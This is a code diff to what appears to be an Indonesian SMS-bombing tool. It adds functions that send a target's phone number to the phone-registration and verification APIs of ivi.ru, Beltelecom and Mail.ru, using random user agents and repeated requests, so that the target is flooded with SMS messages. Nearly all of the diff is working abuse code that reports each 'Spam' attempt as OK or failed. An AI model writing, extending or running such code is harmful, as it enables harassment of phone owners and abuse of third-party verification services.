@@ -60,6 +60,12 @@ class main:
       loding()
       spam.matahari(nom)
       loding()
+      spam.iviru(nom)
+      loding()
+      spam.beltelecom(nom)
+      loding()
+      spam.mailru(nom)
+      loding()
       print (f"{ken}[{kun}•{ken}] {kan}Proses selesai")
   except ru.ConnectionError:print (f"{ken}[{kun}•{ken}]{kan} Koneksi Error")
   except KeyboardInterrupt:print (f"{ken}[{kun}•{ken}]{kun} Program dihentikan")
@@ -469,6 +475,42 @@ class spam:
       print (f"{ken}[{kun}•{ken}] {ken}Spam {kan}({kun}SMS{kan}) {ken}Matahari{kan} OK")
      else:
       print (f"{ken}[{kun}•{ken}] {ken}Spam {kan}({kun}SMS{kan}) {ken}Matahari{kun} Gagal")
+ def iviru(nom):
+     r = ru.Session()
+     hd = {'user-agent':ua.random}
+     dat = {'phone':'62'+nom}
+     for x in range(2):
+       hlo = r.post("https://api.ivi.ru/mobileapi/user/register/phone/v6",headers=hd,data=dat)
+     if 'error' in hlo.text:
+      print (f"{ken}[{kun}•{ken}] {ken}Spam {kan}({kun}SMS{kan}) {ken}ivi.ru{kun} Gagal")
+     else:
+      print (f"{ken}[{kun}•{ken}] {ken}Spam {kan}({kun}SMS{kan}) {ken}ivi.ru{kan} OK")
+ def beltelecom(nom):
+     r = ru.Session()
+     hd = {'user-agent':ua.random}
+     dat = {'phone':'62'+nom}
+     ho = r.post("https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru",headers=hd,data=dat)
+     if ('error' in ho.text) or ('Too many' in ho.text):
+      print (f"{ken}[{kun}•{ken}] {ken}Spam {kan}({kun}SMS{kan}) {ken}Beltelecom{kun} Gagal")
+     else:
+      print (f"{ken}[{kun}•{ken}] {ken}Spam {kan}({kun}SMS{kan}) {ken}Beltelecom{kan} OK")
+ def mailru(nom):
+     r = ru.Session()
+     hd = {
+'user-agent':ua.random ,
+'Content-Type':'application/json',
+}
+     dat = json.dumps({
+'phone':'62'+nom,
+'api':2,
+'email':'akuntesnuyul@gmail.com',
+'x-email':'akunnuyul64@gmail.com',
+})
+     yu = r.post("https://cloud.mail.ru/api/v2/notify/applink",headers=hd,data=dat)
+     if 'error' in yu.text:
+      print (f"{ken}[{kun}•{ken}] {ken}Spam {kan}({kun}SMS{kan}) {ken}MailRu{kun} Gagal")
+     else:
+      print (f"{ken}[{kun}•{ken}] {ken}Spam {kan}({kun}SMS{kan}) {ken}MailRu{kan} OK")
 try:
  os.system("clear")
  bnr()
